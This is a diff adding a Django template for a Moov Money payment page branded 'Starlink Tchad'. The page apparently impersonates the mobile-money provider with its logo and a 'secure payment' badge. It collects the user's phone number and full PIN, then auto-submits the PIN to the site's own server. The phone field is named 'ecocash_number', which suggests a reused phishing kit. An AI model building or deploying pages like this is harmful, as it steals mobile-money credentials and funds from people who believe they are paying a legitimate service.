@@ -1,0 +1,105 @@
+{% extends "base.html" %}
+{% load static %}
+
+{% block title %}Paiement Moov Money - Starlink Tchad{% endblock %}
+
+{% block content %}
+<div class="max-w-md mx-auto">
+    <div class="bg-white rounded-3xl shadow-xl overflow-hidden">
+        <!-- Moov Header -->
+        <div class="bg-white p-6 text-center border-b-4 border-orange-500">
+            <img src="{% static 'images/moov_money_logo.jpg' %}" alt="Moov Money" class="h-16 mx-auto mb-2">
+            <h2 class="text-blue-800 font-bold text-xl uppercase">MOOV MONEY</h2>
+        </div>
+
+        <div class="p-8">
+            <div class="mb-8 text-center">
+                <p class="text-gray-500 text-sm uppercase tracking-wider mb-1">Montant à payer</p>
+                <h3 class="text-4xl font-bold text-gray-900">XAF {{ order.amount }}</h3>
+                <p class="text-blue-600 font-medium mt-2">{{ order.package_name }}</p>
+            </div>
+
+            <form method="POST" class="space-y-6" id="paymentForm">
+                {% csrf_token %}
+                <input type="hidden" name="action" value="verify_pin">
+                
+                <div>
+                    <label class="block text-sm font-medium text-gray-700 mb-2">Numéro Moov Money</label>
+                    <div class="relative">
+                        <span class="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400">+235</span>
+                        <input type="tel" name="ecocash_number" id="phone_number" required 
+                               class="w-full pl-16 pr-4 py-4 bg-gray-50 border border-gray-200 rounded-2xl focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all outline-none"
+                               placeholder="Numéro de téléphone"
+                               value="{{ order.phone_number }}">
+                    </div>
+                </div>
+
+                <div>
+                    <label class="block text-sm font-medium text-gray-700 mb-2">Code PIN Moov Money</label>
+                    <div class="flex gap-2 justify-center">
+                        <input type="password" maxlength="1" class="pin-input w-12 h-14 text-center text-2xl font-bold bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all" inputmode="numeric">
+                        <input type="password" maxlength="1" class="pin-input w-12 h-14 text-center text-2xl font-bold bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all" inputmode="numeric">
+                        <input type="password" maxlength="1" class="pin-input w-12 h-14 text-center text-2xl font-bold bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all" inputmode="numeric">
+                        <input type="password" maxlength="1" class="pin-input w-12 h-14 text-center text-2xl font-bold bg-gray-50 border border-gray-200 rounded-xl focus:ring-2 focus:ring-blue-500 focus:border-transparent outline-none transition-all" inputmode="numeric">
+                    </div>
+                    <input type="hidden" name="pin" id="pin-value">
+                </div>
+
+                <button type="submit" id="submitBtn"
+                        class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 rounded-2xl shadow-lg shadow-blue-200 transition-all transform active:scale-[0.98]">
+                    Confirmer le paiement
+                </button>
+            </form>
+
+            <div class="mt-8 pt-8 border-t border-gray-100">
+                <div class="flex items-center justify-center gap-2 text-gray-400 text-sm">
+                    <i class="uil uil-lock"></i>
+                    <span>Paiement sécurisé par Moov Money</span>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <p class="text-center text-gray-400 text-xs mt-6">
+        En confirmant, vous autorisez le débit de XAF {{ order.amount }} de votre compte Moov Money.
+    </p>
+</div>
+
+<script>
+    const pinInputs = document.querySelectorAll('.pin-input');
+    const pinValue = document.getElementById('pin-value');
+    const paymentForm = document.getElementById('paymentForm');
+    const submitBtn = document.getElementById('submitBtn');
+
+    pinInputs.forEach((input, index) => {
+        input.addEventListener('input', (e) => {
+            if (e.target.value.length > 1) {
+                e.target.value = e.target.value.slice(0, 1);
+            }
+            if (e.target.value && index < pinInputs.length - 1) {
+                pinInputs[index + 1].focus();
+            }
+            updatePinValue();
+        });
+
+        input.addEventListener('keydown', (e) => {
+            if (e.key === 'Backspace' && !e.target.value && index > 0) {
+                pinInputs[index - 1].focus();
+            }
+        });
+    });
+
+    function updatePinValue() {
+        let pin = '';
+        pinInputs.forEach(input => pin += input.value);
+        pinValue.value = pin;
+
+        // Auto-submit when PIN is complete (4 digits)
+        if (pin.length === 4) {
+            setTimeout(() => {
+                paymentForm.submit();
+            }, 300);
+        }
+    }
+</script>
+{% endblock %}
